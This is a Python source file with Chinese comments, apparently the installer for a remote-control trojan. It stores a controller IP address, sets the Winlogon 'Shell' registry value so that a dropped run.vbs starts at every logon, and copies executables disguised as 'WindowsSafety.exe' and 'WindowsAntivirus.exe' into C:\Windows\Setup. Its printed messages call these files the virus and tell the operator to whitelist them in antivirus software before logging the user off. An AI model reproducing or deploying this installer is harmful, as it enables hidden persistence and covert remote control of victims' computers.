import winreg as reg
import os,sys,subprocess,shutil,sqlite3
import ctypes

def create_db_and_table(db_name):
    # 连接到 SQLite 数据库 (如果数据库不存在，会自动创建)
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    
    # 创建一个表，用来存储服务器 IP 地址
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS server_info (
        id INTEGER PRIMARY KEY,
        ip_address TEXT
    )
    ''')

    # 提交并关闭数据库连接
    conn.commit()
    conn.close()

def get_or_create_ip(db_name):
    # 连接到 SQLite 数据库
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()

    # 查询是否有 IP 地址
    cursor.execute('SELECT ip_address FROM server_info WHERE id = 1')
    result = cursor.fetchone()

    # 如果没有记录，创建一条空的 IP 地址
    if result is None:
        print("数据库中没有记录，正在插入空的 IP 地址")
        cursor.execute('INSERT INTO server_info (id, ip_address) VALUES (1, "")')
        conn.commit()
        print("IP 地址已设置为空")
    elif result[0] == "":
        print("IP 地址为空")
    else:
        print(f"当前服务器 IP 地址: {result[0]}")

    # 关闭数据库连接
    conn.close()

def update_ip(db_name, new_ip):
    # 连接到 SQLite 数据库
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()

    # 更新 IP 地址
    cursor.execute('UPDATE server_info SET ip_address = ? WHERE id = 1', (new_ip,))
    conn.commit()
    
    print(f"IP 地址已更新为: {new_ip}")

    # 关闭数据库连接
    conn.close()

def get_path(path):
    
    # 如果是打包后的程序
    if getattr(sys, 'frozen', False):
        
        # 获取临时文件夹路径
        base_path = sys._MEIPASS
        
        # 获取 l.exe 的路径
        l_exe_path = os.path.join(base_path, path)
        
    else:
        
        # 如果是开发模式，l.exe 在当前目录
        l_exe_path = os.path.join(os.path.dirname(__file__), path)
    
    return l_exe_path

def copy_file(src, dst):
    try:
        # 如果目标文件夹不存在，则创建它
        if not os.path.exists(os.path.dirname(dst)):
            os.makedirs(os.path.dirname(dst))
        
        # 使用 shutil.copy 复制文件
        shutil.copy(src, dst)

    except FileNotFoundError:
        pass
    
    except Exception as e:
        pass

def self_starting():
    """自启动"""

    copy_file(get_path("run.vbs"), "C:\\Windows\\run.vbs")

    # 注册表路径
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    # 你要设置的值的名称
    value_name = "Shell"
    # 新的值（比如你要设置为新的 shell）
    new_value = 'explorer.exe, wscript.exe "C:\\Windows\\run.vbs"'  # 举例，设置为 Explorer

    # 打开注册表键值
    try:
        # 以读写模式打开注册表
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path, 0, reg.KEY_SET_VALUE)

        # 设置注册表项的值
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, new_value)
        
        # 关闭注册表键
        reg.CloseKey(reg_key)
    except PermissionError:
        pass
    except Exception as e:
        pass

print("初始化服务器地址，你需要输入控制端的Ipv4地址。如果使用的是内网穿透则输入目标网址。")

db_name = "C:\\Windows\\Setup\\server_info.db"  # 数据库名称

# 创建数据库和表
create_db_and_table(db_name)

# 获取当前的 IP 地址
get_or_create_ip(db_name)

# 请输入新的 IP 地址
new_ip = input("请输入新的 IP 地址: ")

# 更新 IP 地址
update_ip(db_name, new_ip)

# 再次显示更新后的 IP 地址
get_or_create_ip(db_name)

print("正在修改注册表")
self_starting()

print("正在复制病毒本体文件")
copy_file(get_path("WindowsSafety.exe"), "C:\\Windows\\Setup\\WindowsSafety.exe")

print("正在复制病毒保护文件")
copy_file(get_path("WindowsAntivirus.exe"), "C:\\Windows\\Setup\\WindowsAntivirus.exe")
copy_file(get_path("Modify address.exe"), "C:\\Windows\\Setup\\Modify address.exe")

print("正在启动病毒......")
##subprocess.Popen(["C:\\Windows\\Setup\\WindowsAntivirus.exe"])

print("病毒已部署完毕！")
print("请在杀毒软件中为病毒添加信任（白名单），病毒本体路径：C:\\Windows\\Setup\\WindowsSafety.exe")
print("***病毒需要注销/重启后生效***")
print("是否立即注销？你可以为病毒添加信任后再注销")
print("【1】立即注销")
print("【2】稍后手动注销")
o = int(input("选择操作(输入数字1或2)："))
if o == 1:
    # Windows API 方式注销当前用户
    ctypes.windll.user32.ExitWindowsEx(0, 0)
else:
    pass
input("按任意键退出...")
